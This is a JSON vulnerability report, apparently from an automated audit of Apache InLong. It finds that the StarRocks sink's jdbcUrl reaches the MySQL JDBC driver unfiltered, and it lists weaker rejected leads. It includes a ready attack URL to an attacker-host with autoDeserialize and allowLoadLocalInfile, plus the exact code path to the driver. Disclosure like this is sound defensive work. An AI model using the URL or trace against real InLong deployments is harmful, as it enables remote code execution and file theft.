@@ -1,0 +1,79 @@
+{
+  "candidates": [
+    {
+      "attacker_control": "An authenticated manager user who can create/update a StarRocks sink in a stream fully controls the jdbcUrl string (StarRocksSinkRequest.java:42-44 only rejects whitespace). The value must start with jdbc:mysql://, after which arbitrary query parameters can be appended, e.g. jdbc:mysql://attacker-host:3306/db?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&allowLoadLocalInfile=true.",
+      "confidence": "medium",
+      "counterevidence_checked": "Checked that UrlVerificationUtils only validates prefix/host:port and does not touch query parameters; that StarRocksSinkRequest/StarRocksSinkDTO have no call to MySQLSensitiveUrlUtils (grep of all filterSensitive call sites shows only MySQLSinkDTO, MySQLDataNodeDTO, StarRocksDataNodeDTO, OceanBaseJdbcUtils); that the data-node path is filtered while the sink path is not; that the driver class is the MySQL Connector/J driver; and that the manager Docker image installs mysql-connector-java 8.0.28. No runtime or build verification was performed, and I did not assemble or test a gadget chain.",
+      "id": "starrocks-sink-unfiltered-jdbc-url",
+      "impact": "Manager-JVM compromise: remote code execution via Java deserialization of server-controlled data when a suitable gadget is on the manager classpath (fastjson and commons-collections are used/depended on in manager modules), plus arbitrary local file disclosure (allowLoadLocalInfile) and arbitrary outbound connections to internal MySQL services. If the sink is also materialized in the sort job, the same URL reaches the sort/Flink cluster. This is exactly the JDBC URL attack class the codebase's own comments reference (Constants.AUTO_DESERIALIZE comment in inlong-sort and MySQLSensitiveUrlUtils) and that the project mitigates elsewhere.",
+      "locations": [
+        {
+          "end_line": 69,
+          "path": "inlong-manager/manager-service/src/main/java/org/apache/inlong/manager/service/resource/sink/starrocks/StarRocksJdbcUtils.java",
+          "start_line": 55
+        },
+        {
+          "end_line": 116,
+          "path": "inlong-manager/manager-pojo/src/main/java/org/apache/inlong/manager/pojo/sink/starrocks/StarRocksSinkDTO.java",
+          "start_line": 101
+        },
+        {
+          "end_line": 112,
+          "path": "inlong-manager/manager-service/src/main/java/org/apache/inlong/manager/service/resource/sink/starrocks/StarRocksResourceOperator.java",
+          "start_line": 98
+        },
+        {
+          "end_line": 118,
+          "path": "inlong-manager/manager-pojo/src/main/java/org/apache/inlong/manager/pojo/util/MySQLSensitiveUrlUtils.java",
+          "start_line": 62
+        },
+        {
+          "end_line": 82,
+          "path": "inlong-manager/manager-service/src/main/java/org/apache/inlong/manager/service/resource/sink/oceanbase/OceanBaseJdbcUtils.java",
+          "start_line": 76
+        }
+      ],
+      "prerequisites": "1) Ability to save a StarRocks sink and trigger its resource workflow (SinkRequest.enableCreateResource defaults to 1; sink resource creation is driven by SinkResourceListener/StreamSinkResourceListener); 2) an attacker-controlled MySQL-protocol server reachable from the manager (URL verification allows any host/port); 3) the deployed manager image bundles mysql-connector-java 8.0.28 (inlong-manager/manager-docker/Dockerfile:40-46), which honors autoDeserialize/allowLoadLocalInfile; 4) in some deployments the workflow may require group approval or enableCreateResource=0, which would delay/block the manager-side connection.",
+      "root_cause": "The StarRocks sink path never applies the project's JDBC-URL sensitive-parameter filter. StarRocksSinkDTO.getFromRequest copies the user-supplied jdbcUrl into the persisted DTO unchanged, and StarRocksJdbcUtils.getConnection calls DriverManager.getConnection(url,user,password) with that raw string using com.mysql.cj.jdbc.Driver. Only UrlVerificationUtils (prefix + host:port shape) is invoked, which does not remove or neutralize parameter properties such as autoDeserialize, allowLoadLocalInfile, allowUrlInLocalInfile, or queryInterceptors/statementInterceptors. Sibling code shows the intended control: MySQLSinkDTO.getFromRequest calls filterSensitive (MySQLSinkDTO.java:88), StarRocksDataNodeDTO.convertToJdbcUrl and MySQLDataNodeDTO.convertToJdbcurl call MySQLSensitiveUrlUtils.filterSensitive, and OceanBaseJdbcUtils filters before connecting (OceanBaseJdbcUtils.java:80). None of these is reachable for a StarRocks sink's own jdbcUrl.",
+      "title": "StarRocks sink JDBC URL reaches mysql-connector-java unfiltered (JDBC URL attack / deserialization in manager)",
+      "trace": "Sink create/update API binds StarRocksSinkRequest.jdbcUrl -> StarRocksSinkOperator.setTargetEntity -> StarRocksSinkDTO.getFromRequest (no filter) -> objectMapper serializes raw URL into StreamSinkEntity.extParams. When the resource workflow runs, StarRocksResourceOperator.createTable reads the stored URL (getStarRocksInfo returns DTO as-is) and calls StarRocksJdbcUtils.createDb/createTable/addColumns (lines 107-112). Those call executeSql -> getConnection, which does Class.forName(\"com.mysql.cj.jdbc.Driver\") and DriverManager.getConnection(url, user, password) after only UrlVerificationUtils.extractHostAndValidatePortFromJdbcUrl (prefix and numeric port check). The driver therefore sees the attacker's properties: autoDeserialize=true causes Java deserialization of objects returned by the rogue server, and allowLoadLocalInfile=true makes the client read and send local files on server request. The same raw URL is also serialized into the sort job (StarRocksProvider passes starRocksSink.getJdbcUrl() into StarRocksLoadNode), widening exposure.",
+      "unverified": "Whether a native-deserialization gadget chain and the required interceptor class are actually present in the shipped manager classpath; whether the vulnerable connection is triggered in a default deployment without an intervening approval/admin step; exploitability of the MySQL driver's URL-property handling for the exact 8.0.28 build; and whether the sort job path (rather than the manager resource workflow) is the first to connect. These are runtime/dependency questions, so the finding is a strong lead, not a confirmed exploit.",
+      "weakness_type": "Deserialization of Untrusted Data via unfiltered JDBC URL properties (CWE-502); arbitrary local file read (CWE-73) and outbound connection (CWE-918) as secondary effects"
+    }
+  ],
+  "coverage_summary": "Text search and bounded reading across the InLong tree, focused on the manager (sinks, resource operators, JDBC utils, filters/auth, DTO validation), and sampled agent, sort/sort-standalone, audit, dataproxy and tubemq code for deserialization, command execution, SSRF, SQL/path/URL handling and authentication patterns. All 6,185 model-visible files were searchable under the reported filters; I read the complete relevant classes (StarRocks/MySQL/OceanBase sink DTOs, operators, JDBC utils, MySQLSensitiveUrlUtils, UrlVerificationUtils, Shiro/auth filters) but only sampled the rest of the repository. No build, test, scanner or runtime execution was performed.",
+  "limitations": [
+    "No code execution, build, dependency resolution, or runtime confirmation; all conclusions are source-level.",
+    "Binary/dependency jars were not inspected, so the presence of a working deserialization gadget and the exact behavior of mysql-connector-java 8.0.28 were not verified.",
+    "The exact deployment workflow (approval gates, enableCreateResource, whether sink resource creation runs automatically) was not verified.",
+    "Large parts of the repository (dashboard frontend, CDC connectors, TubeMQ UI, tests/resources) were only pattern-searched, not fully read.",
+    "Uncertainty remains about whether this snapshot's intended issue is this missing filter or one of the related JDBC-filter weaknesses; the StarRocks manager-side path was selected as the most direct (attacker URL -> DriverManager in the manager process)."
+  ],
+  "rejected_leads": [
+    {
+      "lead": "OceanBase sink path: OceanBaseSinkDTO.getFromRequest (lines 86-91) also stores the user jdbcUrl unfiltered, and the sort side only applies the weak JdbcUrlUtils.replaceInvalidUrlProperty (literal autoDeserialize=true replacement, no URL-decoding/whitespace handling) before the jdbc-inlong connector connects (OceanBaseLoadNode -> connector=jdbc-inlong, url preserved by setDbNameToUrlWithCdc).",
+      "reason": "Real related gap and possibly part of the same CVE family, but the manager-side connection in this path is filtered by OceanBaseJdbcUtils (line 80), so exploitation depends on the sort/Flink pipeline and the exact driver; less directly evidenced than the StarRocks path where the manager itself connects with the raw URL."
+    },
+    {
+      "lead": "MySQLJdbcUtils.getConnection (lines 54-58) has no MySQLSensitiveUrlUtils.filterSensitive call.",
+      "reason": "Latent only: MySQLResourceOperator/DataNodeOperator receive URLs already filtered at save time (MySQLSinkDTO.getFromRequest:88, MySQLDataNodeDTO.convertToJdbcurl:84), so I found no reachable path that supplies an unfiltered MySQL-mysql URL to this method."
+    },
+    {
+      "lead": "MySQLSensitiveUrlUtils.filterSensitive uses case-sensitive map checks in the parameter-rebuild loop (lines 99-104), so e.g. ALLOWLOADLOCALINFILEINPATH could survive; and only '=true'/'=yes' boolean spellings are removed.",
+      "reason": "No concrete RCE/read primitive found: surviving properties are the path-allowlist knob (not the enable flag), and I could not confirm a boolean spelling other than true/yes that Connector/J treats as enabled; hence unconfirmed."
+    },
+    {
+      "lead": "CommandExecutorImpl.modifyConfig builds shell commands via string concatenation of config values (agent/cluster name, tags) and execRemote wraps commands in sh -c (lines 88, 114-120).",
+      "reason": "Plausible stored command injection, but it requires cluster/agent management privileges (admin-level), and I did not trace validation of cluster name/tags end-to-end; rejected in favor of the unauthenticated-lower-privilege JDBC candidate."
+    },
+    {
+      "lead": "OpenAPI authentication is disabled by default (openapi.auth.enabled=false -> OpenAPIAuthenticatingRealm.doDefaultAuth returns the default admin user for /openapi/**).",
+      "reason": "Configuration-dependent design behavior rather than a code validation flaw; no source evidence that it violates an intended security boundary."
+    },
+    {
+      "lead": "Sort-side JdbcUrlUtils.replaceInvalidUrlProperty performs only a literal/case-insensitive replacement of autoDeserialize=true.",
+      "reason": "A weak defense-in-depth control; no independently attacker-controlled URL feed identified beyond the cases above, so it is folded into the OceanBase/StarRocks analysis rather than submitted separately."
+    }
+  ],
+  "summary": "Reviewed the Apache InLong 2.2.0-SNAPSHOT tree (6,185 files) with source search/reading only. The strongest source-evidenced issue is an unfiltered, user-controlled MySQL JDBC URL reaching mysql-connector-java in the manager's StarRocks sink resource path: the project maintains MySQLSensitiveUrlUtils.filterSensitive (and applies it in the MySQL sink DTO, the MySQL/StarRocks data-node converters, and OceanBaseJdbcUtils), but StarRocksSinkDTO stores the raw jdbcUrl and StarRocksJdbcUtils.getConnection passes it straight to DriverManager.getConnection after only prefix/port validation. This re-opens the classic JDBC URL attack (autoDeserialize / allowLoadLocalInfile / interceptor properties) inside the manager JVM. I select this one candidate; related but weaker/indirect leads are recorded as rejected."
+}
